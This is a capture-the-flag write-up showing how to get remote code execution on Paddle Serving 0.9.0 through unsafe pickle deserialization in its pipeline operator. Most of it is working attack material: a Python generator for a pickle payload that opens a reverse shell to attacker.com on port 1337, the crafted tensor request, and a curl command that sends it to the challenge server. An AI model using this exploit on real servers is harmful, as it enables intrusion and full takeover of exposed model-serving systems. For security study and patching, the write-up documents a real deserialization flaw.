# Paddle

**Tags**: Clone-and-Pwn, web

> Flexible to serve ML models, and more.

For this challenge, we are given a Dockerfile that installs the latest version of [Paddle Servinge](https://github.com/PaddlePaddle/Serving) and runs the built-in demo.

```Dockerfile
FROM python:3.6-slim
RUN apt-get update && \
    apt-get install libgomp1 && \
    rm -rf /var/lib/apt/lists/*
RUN pip install \
    paddle-serving-server==0.9.0 \
    paddle-serving-client==0.9.0 \
    paddle-serving-app==0.9.0 \
    paddlepaddle==2.3.0
WORKDIR /usr/local/lib/python3.6/site-packages/paddle_serving_server/env_check/simple_web_service
RUN cp config_cpu.yml config.yml
RUN echo "rwctf{this is flag}" > /flag
CMD ["python", "web_service.py"]
```

Looking at the codebase, we can find Pickle deserialization in the [`python/pipeline/operator.py`](https://github.com/PaddlePaddle/Serving/blob/v0.9.0/python/pipeline/operator.py) file. So if can control the `tensor` argument of `proto_tensor_2_numpy`, we can get RCE.

This method is called in `unpack_request_package` and because `Op` is the supertype of all the operator classes, it will get called when the server processes our request.

```python
class Op(object):
    def proto_tensor_2_numpy(self, tensor):
        # [...]
        elif tensor.elem_type == 13:
            # VarType: BYTES
            byte_data = BytesIO(tensor.byte_data)
            np_data = np.load(byte_data, allow_pickle=True)
        # [...]
    
    def unpack_request_package(self, request):
        # [...]
        for one_tensor in request.tensors:
            name = one_tensor.name
            elem_type = one_tensor.elem_type

            # [...]
            
            numpy_dtype = _TENSOR_DTYPE_2_NUMPY_DATA_DTYPE.get(elem_type)
            
            if numpy_dtype == "string":
                # [...]
            else:
                np_data, np_lod = self.proto_tensor_2_numpy(one_tensor)
                dict_data[name] = np_data
                if np_lod is not None:
                    dict_data[name + ".lod"] = np_lod

```

So `request` should contain:
```json
{
    "tensors": [
        {
            "name": ":psyduck:",
            "elem_type": 13,
            "byte_data": "pickled data"
        }
    ]
}
```

Where pickled data can be generated with the classic Pickle RCE payload:
```python
import pickle
import base64

reverse_shell = """export RHOST="attacker.com";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(reverse_shell,))

print(base64.b64encode(pickle.dumps(PickleRce())))
```

So finally we can send the exploit to get a reverse shell:
```sh
curl -v http://47.88.23.73:37068/uci/prediction -d '{"tensors": [{"name": ":psyduck:", "elem_type": 13, "byte_data": "gANjcG9z..."}]}'
```

```sh
cat /flag
```
> `rwctf{R0ck5-with-PaddLe-s3rv3r}`
